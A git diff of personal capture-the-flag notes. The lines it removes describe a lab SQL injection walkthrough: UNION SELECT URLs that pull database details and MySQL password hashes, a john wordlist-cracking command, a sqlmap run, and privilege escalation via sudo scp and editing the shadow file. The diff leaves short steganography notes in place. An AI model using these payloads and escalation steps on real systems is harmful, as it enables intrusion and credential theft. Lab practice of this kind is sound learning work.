@@ -7,85 +7,7 @@ date:
 toc: true
 ---
 
-## Jursassic Park
-- Looks like SQL injection from questions
-- robots.txt from Pickle Rick?
-- nmap shows open SSH that takes passwords
-- Some fitering on id (@, -)
-- Using # for comments works
-
-### 1 - Database name and 
-http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,%20null,%20DATABASE(),%20null 
-- Output can be gained from the 4th or 5th column
-
-- Use DATABASE() command
-
-### 2 - Number of columns
-- Also gives use the number of columns
-- (5)
-
-### 3 - Version of OS
-
-- Use version() command
-- http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,null%20,%20version(),%20null
-- Tells us that is mysql 5.7
-
-### 4 - dennis's password
-
-http://10.0.0.246/item.php?id=0%20union%20select%20null,%20null,%20null,%20authentication_string,%20user%20from%20mysql.user%20LIMIT%201%20OFFSET%200%20#
-
-- can't read /etc/passwd
-- get password for mysql
-john --wordlist=/usr/share/wordlists/rockyou.txt jurassic.txt
-
-sqlmap -u http://10.0.0.246/item.php?id=1 -p id --dbms mysql 5.7 --suffix="#"
-
-http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20table_schema%20FROM%20information_schema.tables%20WHERE%20table_schema=%22park%22%20LIMIT%201%20OFFSET%201#
-users tables
-
-http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20COLUMN_NAME%20FROM%20information_schema.columns%20WHERE%20table_name=%22users%22%20LIMIT%201%20OFFSET%202#
-
-usernames, password
-
-usernames filtered so
-
-http://10.0.0.132/item.php?id=0%20union%20select%20*,%20null,%20null%20FROM%20users%20%20LIMIT%201%20OFFSET%200#
-
-ssh access
-
-love the sqlmap trolling
-
-look at .bash_history
-Flag 3
-notice sudo us
-sudo -l show scp nopasswd
-sudo scp /root/flag5.txt dennis@10.0.0.132:~/
-
-notice hint in web directory
-cannot use mysql vuln so just reverse shell then esc
-
-reverse shell to msf
-local exploit suggestor
-
-...
-- ubuntu directory
-- boot grub
-- bash histroy of dennis
-
-- root
-
-scp can do local copy too
-I am dumb
-edit shadow file to same password as dennis and su
-
-Flag 4 is in /tmp according to .viminfo but no sign of it
-
-## Base 64
-- Open in python
-- Decode 50 times
-- Print result
-
-## Steganography
+# Steganography
 
 ### Flag 1
 Exif tool on Lenna
@@ -123,6 +45,7 @@ Found original to have same barcode structure
 On a whim downloaded the image next to the download button because that's outside of the box too
 Ran exif tool 
 flag 6
+
 
 ## Protecting Data In Transit
 
